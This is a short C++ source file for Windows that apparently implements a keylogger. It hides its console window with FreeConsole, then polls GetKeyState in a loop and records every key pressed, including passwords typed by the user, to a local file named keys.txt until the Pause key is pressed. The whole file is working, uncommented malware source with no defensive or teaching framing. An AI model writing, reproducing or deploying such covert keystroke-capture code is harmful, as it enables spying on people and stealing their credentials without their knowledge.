#include <iostream>
#include <windows.h>
#include <fstream>

int main() {
	
	std::string path = "keys.txt";
	std::ofstream File(path);
	FreeConsole();
	while (!GetKeyState(VK_PAUSE)) {
		
		for (int x = 0; x < 120; x++) {
			if (GetKeyState(x) & 0x8000) {
				if (x == 8) {
					File << "|BACKSPACE|";
				}
				else {
					File << (char)x;
				}
				
				Sleep(100);
			}
		}
		
	
	}
	File.close();
	
	return 0;
}
